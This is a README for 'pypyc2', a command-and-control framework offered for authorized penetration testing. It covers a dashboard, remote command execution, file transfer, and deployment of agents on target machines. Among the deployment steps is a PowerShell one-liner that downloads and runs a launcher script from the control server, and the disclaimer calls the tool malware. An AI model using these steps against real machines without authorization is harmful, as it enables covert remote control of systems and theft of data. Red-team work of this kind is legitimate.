# pypyc2

A Command and Control (C2) framework for authorized security testing and research.

**Components:**
- FastAPI backend server (Python)
- Next.js web dashboard (React/TypeScript)
- Python agent (runs on target machines)

## What It Does

- Web dashboard for managing compromised machines
- Execute commands on remote agents
- Upload/download files
- Monitor agent status (online/offline)
- Generate payloads with rotating tokens (5-min expiry)
- PowerShell launcher for agent deployment

## Quick Start (Docker)

### 1. Build and Start

```bash
docker-compose build
docker-compose up -d
```

### 2. Access Dashboard

- Dashboard: http://localhost:3000
- Default credentials: `admin` / `pypyc2admin`

**IMPORTANT:** Change the default password in [Server/core/security.py](Server/core/security.py)

### 3. Deploy Agent

Find your Windows IP:
```bash
ipconfig
```

On target machine:
```bash
# Option 1: Standard agent
cd Agent
pip install -r requirements.txt
python main.py <YOUR_IP>

# Option 2: All-in-one (no dependencies)
python allinone.py <YOUR_IP>

# Option 3: PowerShell launcher (automated)
IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:8000/payload/launcher.ps1?id=<TOKEN>')
```

Get the token from the **Payloads** page (rotates every 5 minutes).

---

## Manual Setup (Without Docker)

<details>
<summary>Click to expand</summary>

**Backend:**
```bash
cd Server
pip install -r requirements.txt
python main.py
```

**Frontend:**
```bash
cd frontend
npm install
npm run dev
```

**Agent:**
```bash
cd Agent
pip install -r requirements.txt
python main.py <SERVER_IP>
```

</details>

## Usage

- Login at http://localhost:3000 (session: 8 hours)
- Navigate to **Terminal** page to execute commands
- Navigate to **Files** page to upload/download files
- Navigate to **Payloads** page to get deployment token
- Sessions stored in-memory (cleared on server restart)

## Docker Configuration

- **Backend**: Port 8000 on `0.0.0.0` (network accessible)
- **Frontend**: Port 3000 on `127.0.0.1` (localhost only)
- **Uploads**: Persistent volume at `pypyc2-uploads`

```bash
# Useful commands
docker-compose logs -f              # View logs
docker-compose restart              # Restart services
docker-compose down                 # Stop everything
docker-compose down -v              # Stop and delete volumes (WARNING: deletes uploads)
```

## Tech Stack

- **Backend**: FastAPI + Uvicorn + Pydantic + bcrypt
- **Frontend**: Next.js 15 + React 19 + TypeScript + Tailwind CSS
- **Agent**: Python 3 + requests (or stdlib for all-in-one)

## Configuration

Key files to edit:
- `Server/core/security.py` - Change password, session timeout (8h default)
- `Server/core/token_manager.py` - Token lifetime (5 min default)
- `Server/config.py` - Max file size (100MB default)

## Security & Legal

**Use only for authorized testing and research. Unauthorized access to computer systems is illegal.**

This is designed for:
- Penetration testing (with authorization)
- Red team exercises
- Security research


## Disclaimer

This is malware. Use it legally and responsibly. You are responsible for your actions.
